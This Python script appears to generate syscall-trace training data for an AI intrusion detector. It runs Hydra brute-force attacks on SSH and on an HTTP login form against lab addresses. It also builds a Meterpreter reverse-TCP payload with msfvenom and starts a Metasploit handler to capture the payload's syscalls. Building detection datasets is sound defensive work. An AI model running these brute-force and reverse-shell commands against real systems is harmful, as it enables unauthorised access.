import csv
import subprocess
import time
import psutil
import os
import multiprocessing
import netifaces
from pymetasploit3.msfrpc import MsfRpcClient
import json
import re
import filecmp
import random
import pyautogui

JSON_FILE = 'FireArmor-AI-Anomaly-Detection/FireArmor IA/ADFA-LD/DataSet/syscalls.json'


def get_my_ip():
    """  Return the IP address of the current machine 

    Returns:
        str: The IP address of the current machine
    """

    interfaces = netifaces.interfaces()
    for interface in interfaces:
        if interface != 'wlan0':
            addresses = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addresses:
                ipv4_address = addresses[netifaces.AF_INET][0]['addr']
                return ipv4_address

def execute_command(command):
    """ Execute a command in the terminal

    Args:
        command (str): The command to execute
    """
    process = subprocess.Popen(command, shell=True)
    process.wait()

def kill_process_by_port(port):
    for proc in psutil.process_iter():
        try:
            connections = proc.connections()
            for conn in connections:
                if conn.laddr.port == port:
                    proc.kill()
                    print(f"Processus tué : {proc.pid}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

def compare_and_delete_files(folder_path):
    """ Compare all the files in a folder and delete the duplicates

    Args:
        folder_path (str): The path of the folder containing the files
    """
    file_list = os.listdir(folder_path)
    num_files = len(file_list)

    for i in range(num_files):
        for j in range(i + 1, num_files):
            file1 = os.path.join(folder_path, file_list[i])
            file2 = os.path.join(folder_path, file_list[j])
            
            if not os.path.exists(file1):
                print("File does not exist:", file1)
                continue

            if not os.path.exists(file2):
                print("File does not exist:", file2)
                continue

            if filecmp.cmp(file1, file2):
                print("Files are equal. Deleting:", file2)
                os.remove(file2)


def get_syscall_from_ssh():
    """ Get the syscall from the SSH attack
    """
    wordList = '/usr/share/wordlists/rockyou.txt'
    ip_list = ['10.10.10.15','10.10.10.16', '10.10.10.13', '10.10.10.14','10.10.10.12']  # Liste d'adresses IP différentes
    name_list = ['root', 'admin', 'user']  # Liste de noms d'utilisateur différents
    syscall_names_file_base = 'FireArmor-AI-Anomaly-Detection/syscall_names.txt'

    for i in range(40):
        ip = random.choice(ip_list)  # Sélectionne une adresse IP aléatoire
        name = random.choice(name_list)  # Sélectionne un nom d'utilisateur aléatoire
        output_file = 'FireArmor-AI-Anomaly-Detection/output.txt'

        cmd1 = "strace -e trace=all -o {output_file} hydra -l {name} -p {wordList} {ip} ssh".format(
            output_file=output_file, name=name, wordList=wordList, ip=ip)
        cmd2 = "awk -F '(' '{{print $1}}' {output_file} | awk -F ' ' '{{print $NF}}' > {syscall_names_file_base}".format(
            output_file=output_file, syscall_names_file_base=syscall_names_file_base)

        # Exécutez la commande 1
        process = subprocess.Popen(cmd1, shell=True)
        process.wait()

        # Exécutez la commande 2
        process = subprocess.Popen(cmd2, shell=True)
        process.wait()

        replace_syscall_with_number(syscall_names_file_base, 'FireArmor-AI-Anomaly-Detection/FireArmor IA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/UAD-Hydra-SSH-1-{i}.txt'.format(i=i))

def get_syscall_from_hydra_http(json_file):
    """ Get the syscall from the Hydra HTTP attack

    Args:
        json_file (str): The path of the json file containing the data
    """

    output_file = 'FireArmor-AI-Anomaly-Detection/output.txt'
    syscall_names_file_base = 'FireArmor-AI-Anomaly-Detection/syscall_names.txt'

    name_list = ['root', 'admin', 'user']
    name = random.choice(name_list)

    cmd1 = "strace -e trace=all -o {output_file} hydra -l {name} -P {wordList} {ip} http-post-form \"/:username=^USER^&password=^PASS^:F=incorrect\" -V".format(output_file=output_file, name=name, wordList='/usr/share/wordlists/rockyou.txt', ip='10.10.69.36')
    cmd2 = "awk -F '(' '{{print $1}}' {output_file} | awk -F ' ' '{{print $NF}}' > {syscall_names_file_base}".format(output_file=output_file, syscall_names_file_base=syscall_names_file_base)

    # Exécutez la commande 1
    process = subprocess.Popen(cmd1, shell=True)
    process.wait()

    # Exécutez la commande 2
    process = subprocess.Popen(cmd2, shell=True)
    process.wait()

    replace_syscall_with_number(syscall_names_file_base, 'FireArmor-AI-Anomaly-Detection/FireArmor IA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/UAD-Hydra-SSH-1-0.txt')



def get_syscall_from_Meterpreter():
    """ Get the syscall from the Meterpreter attack
    """
    syscall_names_file_base = 'FireArmor-AI-Anomaly-Detection/syscall_names.txt'
    payload = "FireArmor-AI-Anomaly-Detection/meterpreterPayload"
    csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
    output_file = 'FireArmor-AI-Anomaly-Detection/output.txt'

    ip = get_my_ip()
    print('your ip:', ip)

    kill_process_by_port(4444)
    cmd1 = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 --platform linux -a x86 -f elf -o {payload}".format(ip=ip, payload=payload)
    cmd2 = "chmod +x {payload}".format(payload=payload)
    cmd3 = 'msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT 4444; run"'.format(ip=ip)
    cmd4 = "strace -e trace=all -o {output_file}  ./{payload} && awk -F '(' '{{print $1}}' output.txt | awk -F ' ' '{{print $NF}}' > syscall_names.txt".format(payload=payload,output_file=output_file)

    console1 = subprocess.Popen(['xterm', '-e', cmd1], shell=False)
    time.sleep(10)
    console2 = subprocess.Popen(['xterm', '-e', cmd2], shell=False)
    time.sleep(5)

    console3 = subprocess.Popen(['xterm', '-e', cmd3], shell=False)
    time.sleep(10)

    console4 = subprocess.Popen(['xterm', '-e', cmd4], shell=False)
    time.sleep(5)  # Duration for capturing syscall data in seconds
        

    console1.kill() 
    console2.kill()
    console3.kill()
    console4.kill()

    replace_syscall_with_number(syscall_names_file_base, 'FireArmor-AI-Anomaly-Detection/FireArmor IA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-0.txt')


def get_systemcall_from_your_computer(json_file):
    """ Get the syscall from your computer

    Args:
        json_file (str): The path of the json file containing the data
    """
    syscall_regex = r'#define __NR(?:3264_)?(\w+)\s+(\d+)'

    syscalls = {}

    with open('/usr/include/asm-generic/unistd.h', 'r') as f:
        content = f.read()
        matches = re.findall(syscall_regex, content)

        for match in matches:
            syscall_name = match[0].replace("_", "")
            syscall_number = int(match[1])
            syscalls[syscall_name] = syscall_number

    with open(json_file, 'w') as f:
        json.dump(syscalls, f, indent=4)

def replace_syscall_with_number(input_file, output_file):
    """ Replace the syscall name with the syscall number

    Args:
        input_file (str): The path of the file containing the syscall names
        output_file (str): The path of the file containing the syscall numbers
    """
    
    # load syscall numbers from JSON
    with open(JSON_FILE, 'r') as f:
        syscalls = json.load(f)


    # Load syscall numbers from JSON
    with open(input_file, 'r') as input_file, open(output_file, 'w') as output_file:
        for line in input_file:
            syscall_name = line.strip()
            if syscall_name in syscalls:
                syscall_number = syscalls[syscall_name]
                output_file.write(str(syscall_number) + ' ')
            else:
                print('Syscall not found: ' + syscall_name)



if __name__ == "__main__":
    ssh_file = 'FireArmor-AI-Anomaly-Detection/FireArmor IA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/'
    get_systemcall_from_your_computer(JSON_FILE)
    get_syscall_from_ssh()
    # get_syscall_from_Meterpreter()
    # get_syscall_from_hydra_http()
    compare_and_delete_files(ssh_file)